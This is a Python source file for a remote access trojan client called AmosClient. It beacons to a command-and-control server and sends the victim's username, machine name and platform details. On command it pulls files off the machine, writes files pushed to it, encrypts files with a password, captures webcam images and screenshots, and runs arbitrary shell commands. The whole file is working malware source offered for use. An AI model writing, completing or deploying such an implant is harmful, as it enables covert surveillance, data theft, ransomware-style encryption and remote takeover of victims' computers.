import os
import base64
from time import sleep
from requests import get, exceptions
from ServerHandler import ServerHandler
from DataHarvester import DataHarvester
from GeneralFeatures import GeneralFeatures
from client_settings import (SERVER_IP, SERVER_PORT, PROXY, HEADER, CMD_REQUEST,
                             DELAY, CLIENT_CREDENTIALS)


class AmosClient:

    def __init__(self):
        self.server_handler = ServerHandler(SERVER_IP, SERVER_PORT)
        self.data_harvester = DataHarvester()
        self.general_features = GeneralFeatures()
        self.credentials_sent = False


    def start(self):
        client = (os.getenv("USERNAME", "Unknown_Username") + "@" + os.getenv("COMPUTERNAME", "Unknown_Computername"))

        # Try an HTTP GET request to the c2 server and retrieve a command; if it fails, keep trying forever
        while True:
            try:
                response = get(f"http://{SERVER_IP}:{SERVER_PORT}{CMD_REQUEST}{client}",
                               headers=HEADER, proxies=PROXY)
                if response.status_code == 200 and self.credentials_sent == False:
                    platform_info = self.data_harvester.get_platform_info()
                    self.server_handler.post_to_server(platform_info, CLIENT_CREDENTIALS)
                    self.credentials_sent = True

                if response.status_code == 404:
                    raise exceptions.RequestException

            except exceptions.RequestException:
                sleep(DELAY)
                continue  # send timeout signal

            # Retrieve server command via the decoded content of the response object
            command = response.content.decode()
            print(command)

            if 'terminate' in command:
                break

            # Ignore keep-alive command to prevent spam
            if command == "time /T":
                continue

            # Send file
            elif command.startswith("getfile "):
                print("[Getting file....]")
                filename = command.split(maxsplit=1)[1]
                try:
                    file_payload = self.general_features.send_file(filename)
                    self.server_handler.post_to_server(message="", extra_data=file_payload)
                except FileNotFoundError:
                    self.server_handler.post_to_server(f"[-] File not found: {filename}")
                except Exception as e:
                    self.server_handler.post_to_server(f"[-] Send file error: {e}")

            elif command.startswith("sendfile "):
                try:
                    parts = command.split(maxsplit=2)
                    if len(parts) != 3:
                        self.server_handler.post_to_server("[-] Invalid sendfile command")
                    else:
                        _, filename, b64_data = parts
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(b64_data))
                        self.server_handler.post_to_server(f"[+] File saved: {filename}")
                except Exception as e:
                    self.server_handler.post_to_server(f"[-] Sendfile error: {e}")

            # Send platform info to server
            elif command.startswith("get "):
                try:
                    res = self.data_harvester.get_platform_info()
                    print(res)
                except:
                    pass

            elif command.startswith("encrypt "):
                parts = command.split()
                if len(parts) != 3:
                    self.server_handler.post_to_server("[-] Usage: encrypt <filename> <password>")
                else:
                    filename = parts[1]
                    password = parts[2]
                    try:
                        out = self.general_features.encrypt_file(filename, password)
                        self.server_handler.post_to_server(f"[+] Encrypted: {out}")
                    except Exception as e:
                        self.server_handler.post_to_server(f"[-] Encrypt error: {e}")

            elif command.startswith("decrypt "):
                parts = command.split()
                if len(parts) != 3:
                    self.server_handler.post_to_server("[-] Usage: decrypt <filename> <password>")
                else:
                    filename = parts[1]
                    password = parts[2]
                    try:
                        out = self.general_features.decrypt_file(filename, password)
                        self.server_handler.post_to_server(f"[+] Decrypted: {out}")
                    except Exception as e:
                        self.server_handler.post_to_server(f"[-] Decrypt error: {e}")

            # Send camshot
            elif command == "camshot":
                try:
                    image_bytes = self.general_features.camshot()
                    self.server_handler.post_to_server(image_data=image_bytes)
                except Exception as e:
                    self.server_handler.post_to_server(f"[-] Camshot error: {e}")

            # Send screenshot
            elif command == "screenshot":
                img_bytes = self.general_features.screenshot()
                self.server_handler.post_to_server(image_data=img_bytes)
                if os.path.isfile("screenshot.png"):
                    os.remove("screenshot.png")

            else:
                self.server_handler.run_command(command)
                print(response.status_code)


client = AmosClient()
client.start()